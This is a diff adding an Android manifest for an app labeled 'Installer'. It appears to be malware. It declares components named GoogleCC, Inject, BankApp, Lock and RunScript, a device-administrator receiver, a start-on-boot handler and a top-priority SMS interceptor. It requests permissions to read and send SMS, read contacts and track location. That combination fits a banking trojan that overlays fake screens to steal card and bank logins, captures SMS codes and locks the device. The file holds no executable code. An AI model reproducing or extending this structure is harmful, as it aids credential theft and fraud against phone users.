@@ -1,0 +1,62 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" package="com.address.core">
+    <application android:label="Installer" android:icon="@drawable/icon" android:allowBackup="true">
+        <activity android:label="Installer" android:name="com.address.core.MainActivity" android:launchMode="singleTop">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="" android:name="com.address.core.activities.BrowserActivity" android:launchMode="singleTop"/>
+        <activity android:label="" android:name="com.address.core.activities.Browser" android:launchMode="singleTop"/>
+        <activity android:label="" android:name="com.address.core.lck.Lock" android:launchMode="singleTop"/>
+        <activity android:label="" android:name="com.address.core.activities.GoogleCC" android:launchMode="singleTop"/>
+        <activity android:label="" android:name="com.address.core.activities.Inject" android:launchMode="singleTop"/>
+        <activity android:label="" android:name="com.address.core.activities.BankApp" android:launchMode="singleTop"/>
+        <activity android:label="" android:name="com.address.core.activities.RunScript" android:launchMode="singleTop"/>
+        <activity android:label="" android:name="com.address.core.AdminActivity" android:launchMode="singleTop"/>
+        <service android:name="com.address.core.RunService"/>
+        <receiver android:name="com.address.core.OnBootHandler">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".SMSHandler">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:label="Admin" android:name="com.address.core.AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/ok"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".sms.SentReceiver">
+            <intent-filter>
+                <action android:name="SMS_SENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".sms.DeliveredReceiver">
+            <intent-filter>
+                <action android:name="SMS_DELIVERED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+</manifest>
